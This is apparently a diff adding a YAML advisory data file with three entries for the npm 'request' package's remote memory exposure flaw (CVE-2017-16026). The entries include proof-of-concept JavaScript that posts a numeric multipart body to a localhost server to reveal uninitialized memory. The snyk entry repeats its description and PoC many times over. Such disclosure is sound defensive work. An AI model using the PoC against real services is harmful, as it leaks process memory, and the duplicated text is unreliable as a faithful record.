@@ -1,0 +1,169 @@
+---
+- id: nodesecurity:npm:request:2017-04-14
+  title: Remote Memory Exposure
+  description: "Affected versions of `request` will disclose local system memory to
+    remote systems in certain circumstances. When a multipart request is made, and
+    the type of `body` is `number`, then a buffer of that size will be allocated and
+    sent to the remote server as the body.\n\n## Proof of Concept\n\n```\nvar request
+    = require('request');\nvar http = require('http');\n\nvar serveFunction = function
+    (req, res){\n\treq.on('data', function (data) {\n            console.log(data)\n
+    \       });\n\tres.end();\n};\nvar server = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod:
+    \"POST\",\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n```"
+  affected_package: request
+  vulnerable_versions:
+  - ">=2.2.6 <2.47.0 || >2.51.0 <=2.67.0"
+  patched_versions:
+  - ">=2.68.0"
+  severity: medium
+  package_manager: npm
+  cvss_v3_vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+  credit:
+  - Feross Aboukhadijeh
+  references:
+  - |-
+    https://github.com/request/request/pull/2018)
+    https://github.com/request/request/issues/1904)
+  source_url: https://nodesecurity.io/advisories/309
+- id: ossindex:npm:request:2017-02-07
+  title: Remote memory disclosure
+  description: "> If the node process makes a request with a multipart attachment,
+    and the type of the body option is a Number, then that many bytes of uninitialized
+    memory will be sent in the body of the request. \n> \n> -- [github.com](https://github.com/request/request/pull/2018)"
+  affected_package: request
+  vulnerable_versions:
+  - "<2.68.0"
+  package_manager: npm
+  credit:
+  - OSSIndex
+  references:
+  - https://github.com/request/request/commit/29d81814bc16bc79cb112b4face8be6fc00061dd
+  - https://github.com/request/request/issues/2018
+  - https://github.com/request/request/pull/2022
+  source_url: https://ossindex.net/resource/package/7014379316/vulnerabilities
+- id: snykio:npm:request:2016-01-19
+  title: Remote Memory Exposure
+  description: "[`request`][1] is a simplified http request client. A potential remote\nmemory
+    exposure vulnerability exists in `request`. If a `request` uses a\nmultipart attachment
+    and the *body type* option is `number` with value\nX, then X bytes of uninitialized
+    memory will be sent in the body of the\nrequest.\n\nNote that while the impact
+    of this vulnerability is high (memory\nexposure), exploiting it is likely difficult,
+    as the attacker needs to\nsomehow control the body type of the request. One potential
+    exploit\nscenario is when a request is composed based on JSON input, including\nthe
+    body type, allowing a malicious JSON to trigger the memory leak.\n\n\n\n[1]: https://www.npmjs.com/package/request\n\\n[`request`][1]
+    is a simplified http request client. A potential remote\nmemory exposure vulnerability
+    exists in `request`. If a `request` uses a\nmultipart attachment and the *body
+    type* option is `number` with value\nX, then X bytes of uninitialized memory will
+    be sent in the body of the\nrequest.\n\nNote that while the impact of this vulnerability
+    is high (memory\nexposure), exploiting it is likely difficult, as the attacker
+    needs to\nsomehow control the body type of the request. One potential exploit\nscenario
+    is when a request is composed based on JSON input, including\nthe body type, allowing
+    a malicious JSON to trigger the memory leak.\n\n\n\n[1]: https://www.npmjs.com/package/request\n\\n[`request`][1]
+    is a simplified http request client. A potential remote\nmemory exposure vulnerability
+    exists in `request`. If a `request` uses a\nmultipart attachment and the *body
+    type* option is `number` with value\nX, then X bytes of uninitialized memory will
+    be sent in the body of the\nrequest.\n\nNote that while the impact of this vulnerability
+    is high (memory\nexposure), exploiting it is likely difficult, as the attacker
+    needs to\nsomehow control the body type of the request. One potential exploit\nscenario
+    is when a request is composed based on JSON input, including\nthe body type, allowing
+    a malicious JSON to trigger the memory leak.\n\n\n\n[1]: https://www.npmjs.com/package/request\n\\nConstructing
+    a `Buffer` class with integer `N` creates a `Buffer` of\nlength `N` with non zero-ed
+    out memory. **Example:**\n\n    var x = new Buffer(100); // uninitialized Buffer
+    of length 100\n    // vs\n    var x = new Buffer('100'); // initialized Buffer
+    with value of '100'\n\nInitializing a multipart body in such manner will cause
+    uninitialized\nmemory to be sent in the body of the request.\n\n#### Proof of
+    concept   {#proof-of-concept}\n\n    var http = require('http')\n    var request
+    = require('request')\n    \n    http.createServer(function (req, res) {\n      var
+    data = ''\n      req.setEncoding('utf8')\n      req.on('data', function (chunk)
+    {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n\\nConstructing a `Buffer` class with integer `N` creates a `Buffer`
+    of\nlength `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a multipart body in
+    such manner will cause uninitialized\nmemory to be sent in the body of the request.\n\n####
+    Proof of concept   {#proof-of-concept}\n\n    var http = require('http')\n    var
+    request = require('request')\n    \n    http.createServer(function (req, res)
+    {\n      var data = ''\n      req.setEncoding('utf8')\n      req.on('data', function
+    (chunk) {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n\\nConstructing a `Buffer` class with integer `N` creates a `Buffer`
+    of\nlength `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a multipart body in
+    such manner will cause uninitialized\nmemory to be sent in the body of the request.\n\n####
+    Proof of concept   {#proof-of-concept}\n\n    var http = require('http')\n    var
+    request = require('request')\n    \n    http.createServer(function (req, res)
+    {\n      var data = ''\n      req.setEncoding('utf8')\n      req.on('data', function
+    (chunk) {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n\\nConstructing a `Buffer` class with integer `N` creates a `Buffer`
+    of\nlength `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a multipart body in
+    such manner will cause uninitialized\nmemory to be sent in the body of the request.\n\n####
+    Proof of concept   {#proof-of-concept}\n\n    var http = require('http')\n    var
+    request = require('request')\n    \n    http.createServer(function (req, res)
+    {\n      var data = ''\n      req.setEncoding('utf8')\n      req.on('data', function
+    (chunk) {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n\\nConstructing a `Buffer` class with integer `N` creates a `Buffer`
+    of\nlength `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a multipart body in
+    such manner will cause uninitialized\nmemory to be sent in the body of the request.\n\n####
+    Proof of concept   {#proof-of-concept}\n\n    var http = require('http')\n    var
+    request = require('request')\n    \n    http.createServer(function (req, res)
+    {\n      var data = ''\n      req.setEncoding('utf8')\n      req.on('data', function
+    (chunk) {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n\\nConstructing a `Buffer` class with integer `N` creates a `Buffer`
+    of\nlength `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a multipart body in
+    such manner will cause uninitialized\nmemory to be sent in the body of the request.\n\n####
+    Proof of concept   {#proof-of-concept}\n\n    var http = require('http')\n    var
+    request = require('request')\n    \n    http.createServer(function (req, res)
+    {\n      var data = ''\n      req.setEncoding('utf8')\n      req.on('data', function
+    (chunk) {\n        console.log('data')\n        data += chunk\n      })\n      req.on('end',
+    function () {\n        // this will print uninitialized memory from the client\n
+    \       console.log('Client sent:\\n', data)\n      })\n      res.end()\n    }).listen(8000)\n
+    \   \n    request({\n      method: 'POST',\n      uri: 'http://localhost:8000',\n
+    \     multipart: [{ body: 1000 }]\n    },\n    function (err, res, body) {\n      if
+    (err) return console.error('upload failed:', err)\n      console.log('sent')\n
+    \   })\n\n"
+  affected_package: request
+  vulnerable_versions:
+  - "<2.68.0 >2.2.5"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2017-16026
+  cwe:
+  - CWE-201
+  credit:
+  - Feross Aboukhadijeh
+  references:
+  - https://github.com/request/request/pull/2018
+  - https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
+  - https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
+  source_url: https://snyk.io/vuln/npm:request:20160119
